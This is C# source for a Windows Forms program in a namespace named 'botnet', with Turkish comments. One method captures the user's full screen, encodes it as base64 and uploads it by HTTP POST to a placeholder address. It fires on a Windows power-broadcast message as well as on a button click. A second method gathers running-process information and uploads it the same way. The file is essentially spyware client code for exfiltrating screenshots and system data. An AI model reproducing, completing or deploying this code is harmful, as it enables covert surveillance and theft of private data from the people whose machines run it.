using System;
using System.Collections.Specialized;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace botnet
{
    public partial class hacaked : Form
    {
        public hacaked()
        {
            InitializeComponent();
        }
        pc_bilgisi pbgls = new pc_bilgisi();
        protected override void WndProc(ref Message m)
        {
           
            if (m.Msg == 537)
            {
                rsm_yll();
            }
            base.WndProc(ref m);
        }
        private void rsm_yll()//Ekran Resim Paylaş...
        {
            Bitmap Goruntu = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);//Görüntüyü alır.
            Graphics GFX = Graphics.FromImage(Goruntu);//Görüntüyü alır.
            GFX.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size);//Görüntüyü alır.
            pictureBox1.Image = Goruntu;//Görüntüyü alır.
            string base64Image = ImageToBase64(Goruntu, ImageFormat.Jpeg);//Görüntüyü base64'e çevirir.s
            WebClient w = new WebClient();//Yollama aşaması.
            NameValueCollection reqparm = new NameValueCollection();//1
            reqparm.Add("yukle", base64Image);//1                              
            w.UploadValues("adres :)", "POST", reqparm);
            MessageBox.Show("Veri Yollandı");
        }
        void veriyolla_Process()//Process Bilgilerini Yollar...
        {
            pbgls.processscanner();
            pbgls.kıllklsrlstl();
            WebClient w = new WebClient();//Yollama aşaması.
            NameValueCollection reqparm = new NameValueCollection();//Yollama aşaması.
            reqparm.Add("yukle", pc_bilgisi.process_veri);//Yollama aşaması.                            
            w.UploadValues("adres :)", "POST", reqparm);//Yollama aşaması.
            MessageBox.Show("Veri Yollandı");
        }
        private void button1_Click(object sender, EventArgs e)
        {
            rsm_yll();
 
        }
        static string ImageToBase64(Image image, ImageFormat format)//Resim'iBase64'e Dönüştürür...
        {
            using (MemoryStream ms = new MemoryStream())
            {
                // Convert Image to byte[]
                image.Save(ms, format);
                byte[] imageBytes = ms.ToArray();

                // Convert byte[] to Base64 String
                return Convert.ToBase64String(imageBytes);
            }
        }
        private void hacaked_Load(object sender, EventArgs e)
        {

        }
    }
}
